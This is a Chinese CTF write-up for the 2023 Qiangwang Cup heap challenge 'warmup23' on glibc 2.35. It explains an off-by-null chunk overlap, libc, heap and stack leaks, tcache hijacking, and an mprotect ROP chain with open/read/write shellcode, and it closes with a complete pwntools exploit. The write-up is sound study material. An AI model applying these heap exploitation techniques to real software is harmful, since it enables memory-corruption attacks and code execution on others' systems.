#### 思路

常见的堆题目，libc2.35 ，有沙箱，off by null，orw读取flag


进行chunk布局

```
add(0x418) 		# chunk0
add(0x108 - 0x20) 	# chunk1	barrier
add(0x438) 		# chunk2
add(0x438) 		# chunk3
add(0x108) 		# chunk4	barrier
add(0x488)  		# chunk5
add(0x428)  		# chunk6
add(0x108) 		# chunk7	barrier
```

其中chunk3是要被合并的chunk，chunk4是要被overlap的chunk，chunk5是触发合并的chunk

```
delete(0)   
delete(3)   
delete(6) 

delete(2)
add(0x458, b'\x00'*0x438 + p64(0x551)[:-2])
```

旧的unsortedbin指针使得chunk6->chunk3->chunk0

通过分配一个较大的堆块，伪造chunk3的size同时不去修改旧的指针

chunk3的堆块内容

```
0x5587f0139c00: 0x0000000000000000      0x0000000000000551
0x5587f0139c10: 0x00005587f01392b0      0x00005587f013a5e0
0x5587f0139c20: 0x0000000000000000      0x0000000000000421
0x5587f0139c30: 0x00007fa428619ce0      0x00007fa428619ce0
```

为了正常合并，接下来通过堆风水使

```
chunk6->fd = chunk3
chunk0->bk = chunk3
```

此时还有一点是被合并的chunk3的地址为结尾为00，chunk0的bk可以通过off by null伪造

```
add(0x418)  # C1 from ub
add(0x428)  # 6   ->  3
add(0x418)  # 0   ->  6

delete(6)	# delete chunk0
delete(2)	# delete rem chunk

add(0x418, p64(0))  # chunk0->bk = chunk3
add(0x418)          # rem  6，全部申请回来
```

以上操作后，chunk0的bk就会指向rem chunk，但是fake chunk在其上，通过上边说过的off by null成功使chunk0->bk = chunk3

```
delete(6) 	#  rem 
delete(3) 	#  chunk6
delete(5)	#  chunk5
```

使chunk56合并，chunk56->rem

```
add(0x4f8, b'\x00'*0x490)   # 3
```

从chunk56申请，并使rem进入largebin，rem chunk56进入largebin后切割再放入unsortedbin

伪造fd的过程，本质上是分配两个连在一起chunk，第二个chunk的fd的第一字节要被覆盖为00，所以分配稍大于原第一个chunk的chunk，通过off by null修改，同上一步伪造bk的过程，都用了rem chunk23和目标chunk共同放入unsortedbin，来获取一个堆上的指针

```
add(0x3b0)                  # 5
add(0x418) 		    # 6
```

申请回来

```
delete(4)
add(0x108,b'\x00'*0x100 + p64(0x550))
```

通过8字节的溢出修改chunk5的presize，

```
delete(3)		# 3即为tcachebin上的chunk
```

触发向前合并，tcache barrier被extend

```
add(0x430)
show(4)
libc_base = u64(io.recvuntil(b'\x7f')[-6::].ljust(8,b'\x00')) - 0x219ce0
print(hex(libc_base))
```

分配0x430大小chunk，使barrier的用户内容恰为被切割的unsortedbin的指针

再通过tcachebin的fd指针泄露堆基址

```
add(0x300)          # from big unsortedbin chunk
delete(8)           # put into tcachebin 4和8指向同一chunk  
show(4)		    # 泄露fd指针
key = u64(io.recvuntil(b'\x0a')[-1-5:-1:].ljust(8,b'\x00'))
heap_addr = key << 12
print(hex(heap_addr))
```

4和8指向同一个tcachebin chunk

通过将fastbin实现tcachebin的house of spirit

```
add(0x70) # index 4
for i in range(4):
    delete(i)
for i in range(5, 8):
    delete(i)
delete(9)

for i in range(4):
    add(0x70) # index 0 ~ 3
for i in range(5, 8):
    add(0x70) #index 5 ~ 7
add(0x70) #index 9
for i in range(4):
    delete(i)
for i in range(5, 8):
    delete(i)

delete(4)
delete(9)
delete(10)
```

将tcachebin劫持到tcache_pthread_struct结构体处

```
delete(4)
delete(9)
delete(10)

for i in range(7):
    add(0x70)
add(0x70, p64((heap_base + 0xf0) ^ (key + 1)))
```

实现任意内存分配，选择stdout和tcache_pthread_struct偏移处任意堆地址，heap_base + 0x260用来劫持的stack上的chunk

```
environ = libc_base + libc.sym['__environ']
stdout = libc_base + libc.sym['_IO_2_1_stdout_']

add(0x70)
add(0x70)
add(0x70, p64(0) + p64(stdout) + p64(0) + p64(heap_base + 0x260))
```

通过stdout puts泄露栈地址

```
payload = p64(0x00000000fbad1800) + p64(0)*3 + p64(environ) + p64(environ + 8)
add(0xe0, payload)
print(hex(environ))
stack = u64(io.recvuntil(b'\x7f').ljust(8,b'\x00'))
print(hex(stack))
```

劫持0x3c0 tcachebin到stack - 0x148，即add函数的返回地址，只要在add的栈上填充orw，add ret时就会执行

在确认这个0x148偏移时，可以通过gdb.debug来动调确定

```
delete(0)
delete(1)
add(0x100, p64(stack - 0x148))
```

分配add栈的chunk，并写入rop链，ret时执行读取flag

```
ret = libc_base + 0x29139
rsi = libc_base + 0x2be51
rdi = libc_base + 0x2a3e5
rdx = libc_base + 0x796a2
mprotect = libc_base + libc.sym['mprotect']

# gdb.attach(io,'b *$rebase(0x18EF)')

pl = p64(0) + p64(rdi) + p64((stack >> 12) << 12) + p64(rsi) + p64(0x3000) + p64(rdx) + p64(7) + p64(mprotect)
pl += p64(stack - 0x100) + asm(shellcraft.open('./zzz') + shellcraft.read(3, stack + 0x1000, 0x50) + shellcraft.write(1, stack + 0x1000, 0x50))
add(0x3b0, pl)
```

#### exp

```
from pwn import *

context(log_level='debug',arch='amd64',os='linux')

io = process('/home/kali/pwn/warmup23/warmup')
# io = gdb.debug('/home/kali/pwn/warmup23/warmup')
libc = ELF('/home/kali/pwn/warmup23/libc.so.6')



def add(size,content=b'aaaaaaaa'):
    io.sendlineafter(b'>> ',b'1')
    io.sendlineafter(b'Size: ', str(size).encode(encoding='utf-8'))
    io.sendafter(b'Note: ', content)


def show(index):
    io.sendlineafter(b'>> ', b'2')
    io.sendlineafter(b'Index: ', str(index).encode(encoding='utf-8'))


def delete(index):
    io.sendlineafter(b'>> ', b'3')
    io.sendlineafter(b'Index: ', str(index).encode(encoding='utf-8'))


add(0x418)          #0 A = P->fd
add(0x108 - 0x20)   #1 barrier
add(0x438)          #2 B0 helper
add(0x438)          #3 C0 = P , P&0xff = 0      0
add(0x108)          #4 barrier
add(0x488)          # H0. helper for write bk->fd. vitcim chunk.
add(0x428)          # 6 D = P->bk
add(0x108)          # 7 barrier
#
# step 2 use unsortedbin to set p->fd =A , p->bk=D
delete(0)           # A
delete(3)           # C0
delete(6)           # D
# 6->3->0
# unsortedbin: D-C0-A   C0->FD=A
delete(2)   # merge B0 with C0. preserve p->fd p->bk
#
add(0x458, b'\x00'*0x438 + p64(0x551)[:-2])  # put A,D into largebin, split BC. use B1 to set p->size=0x551     0
#
#
# recovery
add(0x418)  # C1 from ub        reminder unsorted   2
add(0x428)  # bk  D  from largebin  6   ->  3
add(0x418)  # fd  A  from largebin  0   ->  6
#
# # step3 use unsortedbin to set fd->bk
# # partial overwrite fd -> bk
delete(6) # A=P->fd 0
delete(2) # C10 rem
# # unsortedbin: C1-A ,   A->BK = C1  2->6 rem->0
add(0x418, p64(0))  # 0     2
add(0x418)          # rem  6
# # #
delete(6) # A=P->fd
delete(3) # C1
delete(5)


add(0x4f8, b'\x00'*0x490)   # 3
add(0x3b0)                  # 5
add(0x418)                  # 6
#
delete(4)
add(0x108,b'\x00'*0x100 + p64(0x550))   # 4

delete(3)

add(0x10)
add(0x10)
add(0x3f8)
show(4)
libc_base = u64(io.recvuntil(b'\x7f')[-6::].ljust(8,b'\x00')) - 0x219ce0

add(0x70) # index 10
delete(4)
show(10)
key = u64(io.recvuntil(b'\x0a')[-1-5:-1:].ljust(8,b'\x00'))-1
heap_base = (key << 12)

add(0x70) # index 4
for i in range(4):
    delete(i)
for i in range(5, 8):
    delete(i)
delete(9)

for i in range(4):
    add(0x70) # index 0 ~ 3
for i in range(5, 8):
    add(0x70) #index 5 ~ 7
add(0x70) #index 9
for i in range(4):
    delete(i)
for i in range(5, 8):
    delete(i)

delete(4)
delete(9)
delete(10)

for i in range(7):
    add(0x70)
add(0x70, p64((heap_base + 0xf0) ^ (key + 1)))

environ = libc_base + libc.sym['__environ']
stdout = libc_base + libc.sym['_IO_2_1_stdout_']

add(0x70)
add(0x70)
add(0x70, p64(0) + p64(stdout) + p64(0) + p64(heap_base + 0x260))

payload = p64(0x00000000fbad1800) + p64(0)*3 + p64(environ) + p64(environ + 8)
add(0xe0, payload)
print(hex(environ))
stack = u64(io.recvuntil(b'\x7f').ljust(8,b'\x00'))
print(hex(stack))

delete(0)
delete(1)
add(0x100, p64(stack - 0x148))


ret = libc_base + 0x29139
rsi = libc_base + 0x2be51
rdi = libc_base + 0x2a3e5
rdx = libc_base + 0x796a2
mprotect = libc_base + libc.sym['mprotect']

# gdb.attach(io,'b *$rebase(0x18EF)')

pl = p64(0) + p64(rdi) + p64((stack >> 12) << 12) + p64(rsi) + p64(0x3000) + p64(rdx) + p64(7) + p64(mprotect)
pl += p64(stack - 0x100) + asm(shellcraft.open('./zzz') + shellcraft.read(3, stack + 0x1000, 0x50) + shellcraft.write(1, stack + 0x1000, 0x50))
add(0x3b0, pl)


gdb.attach(io,'heap')
io.interactive()
```

##### 后

复现此题的过程中，看了三种不同的wp，

[强网杯2023-Writeup - 星盟安全团队](https://blog.xmcve.com/2023/12/18/%E5%BC%BA%E7%BD%91%E6%9D%AF2023-Writeup/#title-22)，[强网杯 2023 By W&amp;M - W&amp;M Team](https://blog.wm-team.cn/index.php/archives/69/#warmup23)，[[原创]2023强网杯warmup题解-Pwn-看雪-安全社区|安全招聘|kanxue.com](https://bbs.kanxue.com/thread-279956.htm)

之前学过house of apple2，对于environ泄露栈地址打stack orw，libc got hijack，也是初次学习
